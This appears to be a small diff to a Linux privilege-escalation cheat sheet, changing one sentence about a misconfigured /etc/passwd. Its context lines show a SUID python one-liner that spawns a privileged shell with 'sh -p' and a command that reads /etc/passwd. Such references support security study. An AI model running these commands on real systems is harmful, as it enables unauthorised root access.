@@ -93,7 +93,7 @@ $ /usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
 <div class="row row-cols-lg-2"><div>
 
-If `/etc/passwd` was <s>intentionally</s> misconfigured
+If `/etc/passwd` was <s>intentionally</s> misconfigured or if it is a misconfigured embedded device.
 
 ```ps
 $ cat /etc/passwd
